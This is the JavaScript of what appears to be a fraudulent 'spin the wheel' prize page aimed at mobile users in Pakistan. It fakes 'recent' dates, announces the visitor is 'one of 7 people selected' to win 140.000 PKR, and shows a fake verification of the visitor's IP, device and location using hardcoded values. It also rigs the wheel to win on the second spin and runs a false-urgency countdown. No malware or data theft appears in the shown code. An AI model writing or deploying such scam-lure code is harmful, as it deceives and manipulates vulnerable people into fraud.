function getURLParameter(name) {
    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
        results = regex.exec(location.search);
    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function dateOffset(f, c) {
    var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
    1 == b && (f = 0);

    var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
        g = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
    return null != !c && 0 != !c && void 0 != !c
        ? h.getDate() + " " + g[h.getMonth()]
        : "day_name_only" == c && b
        ? d[h.getDay()]
        : "top_date" == c && b
        ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear()
        : void 0;
}
document.getElementById("today").innerHTML = dateOffset(0, 'day_name_only');
document.querySelectorAll(".item_date").forEach(function(element) {
    element.innerHTML = dateOffset(2);
})
document.querySelector(".item_date-4").innerHTML = dateOffset(4);
document.querySelector(".item_date-3").innerHTML = dateOffset(3);
var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

var myDate = new Date();
var fullDate = myDate.getDate() + " " + months[myDate.getMonth()] + " " + myDate.getFullYear() + ", " + days[myDate.getDay()];
document.getElementById("topDate").innerHTML = fullDate;
function speak(c) {
    var b = new SpeechSynthesisUtterance();
    var a = speechSynthesis.getVoices();
    b.voice = a[2];
    b.voiceURI = "native";
    b.volume = 1;
    b.rate = 1;
    b.pitch = 1;
    b.text = c;
    b.lang = "en-EN";
    speechSynthesis.speak(b);
}
speak("Congratilations!");

var page = "page",
brand = "device_brand";

var conMid,
mydate = new Date(),
year = mydate.getFullYear(),
month = mydate.getMonth(),
day = mydate.getDate(),
weekday = mydate.getDay(),
count = 1,
headline = document.getElementById("headline"),
topDate = document.getElementById("topDate"),
today = document.getElementById("today"),
con = document.getElementById("container"),
whCon = document.getElementById("wheelCon"),
dWheel = document.getElementById("wheel"),
button = document.getElementById("pressButton"),
device = document.getElementById("devMockup"),
first = document.getElementById("firstpage"),
second = document.getElementById("secondpage");

function setButtonHeight() {
(conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2), (button.style.top = conMid - button.offsetHeight / 2 - (0.2 * button.offsetHeight) / 2 + "px");
}

function spin() {
var modal = $modal({
    content: '<p style="text-align:center;">You have 1 more chance!</p><br><p style="text-align:center;">Please try again!</p>',
});
switch (count) {
    case 1:
        (button.disabled = !0),
            (dWheel.className = "spinAround"),
            setTimeout(function () {
                (button.disabled = !1),
                    modal.show(),
                    $(".modal__btn-close").click(function () {
                        autospin2();
                    });
            }, 6800);
        break;
    case 2:
        (dWheel.className = "spinAround2"),
            setTimeout(function () {
                dWheel.className = dWheel.className + " transparent";
            }, 6800),
            setTimeout(function () {
                (device.style.display = "block"), (device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px"), (device.style.top = conMid - device.offsetHeight / 2 + "px");
            }, 7000),
            setTimeout(function () {
                (first.innerHTML = "<img src='index_files/loading.gif'>"),
                    (first.style.padding = "195px 0px"),
                    setTimeout(function () {
                        first.parentNode.removeChild(first), (second.style.display = "block"), con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000);
                    }, 1500);
            }, 9000);
        confetti.clear();
        document.getElementById("my-canvas").remove();
}
count++;
}

function autospin2() {
spin();
}

function autospin1() {
var modal = $modal({
    content:
        '<p style="text-align:center;">Congratulations! You have been chosen!</p><br><p id="ip_text" style="text-align:center; font-size: 13px;"><b>IP: 95.143.118.90</b> <img id="ip_check" src="index_files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="device_text" style="text-align:center; font-size: 13px;"><b>Device: Mobile</b> <img id="device_check" src="index_files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="browser_text" style="text-align:center; font-size: 13px;"><b>Browser: Chrome 101.0.4951.67</b> <img id="browser_check" src="index_files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="loc_text" style="text-align:center; font-size: 13px;"><b>Location: Pakistan</b> <img id="loc_check" src="index_files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="os_text" style="text-align:center; font-size: 13px;"><b>OS: Android</b> <img id="os_check"src="index_files/check_icon.png" width="10" height="10"" alt="check"></p><br><p style="text-align:center;">You are one of 7 people selected to participate in our loyalty program! You can get 1 gift out of 4!</p><br><p style="text-align:center;">✅ Win <strong>140.000 PKR</strong></p><br> <p style="text-align:center;">Click "OK" to get started!</p>',
});
modal.show();
$("#ip_text").show("slow");
setTimeout(function () {
    $("ip_text").hide("slow");
}, 500);

$("#device_text").show("slow");
setTimeout(function () {
    $("device_text").hide("slow");
}, 1000);

$("#browser_text").show("slow");
setTimeout(function () {
    $("browser_text").hide("slow");
}, 3000);

$("#loc_text").show("slow");
setTimeout(function () {
    $("loc_text").hide("slow");
}, 3500);

$("#os_text").show("slow");
setTimeout(function () {
    $("os_text").hide("slow");
}, 4500);

setTimeout(function () {
    $("#ip_check").fadeIn(100);
}, 1500);
setTimeout(function () {
    $("#device_check").fadeIn(100);
}, 2000);
setTimeout(function () {
    $("#browser_check").fadeIn(100);
}, 4000);
setTimeout(function () {
    $("#loc_check").fadeIn(100);
}, 4500);
setTimeout(function () {
    $("#os_check").fadeIn(100);
}, 5100);

$(".modal__btn-close").click(function () {
    document.getElementById("pressButton").click();
});
}

function countdown() {
var d = parseInt(document.getElementById("mins").innerHTML),
    c = parseInt(document.getElementById("hsecs").innerHTML),
    b = 0,
    a = 0;
0 !== d && 0 === c ? ((b = d - 1), (a = 59)) : 0 !== d || 0 !== c ? ((b = d), (a = c - 1)) : 0 === d && 0 === c && ((b = d), (a = c)),
    a < 10 && (a = "0" + a),
    (document.getElementById("mins").textContent = b),
    (document.getElementById("hsecs").textContent = a);
}
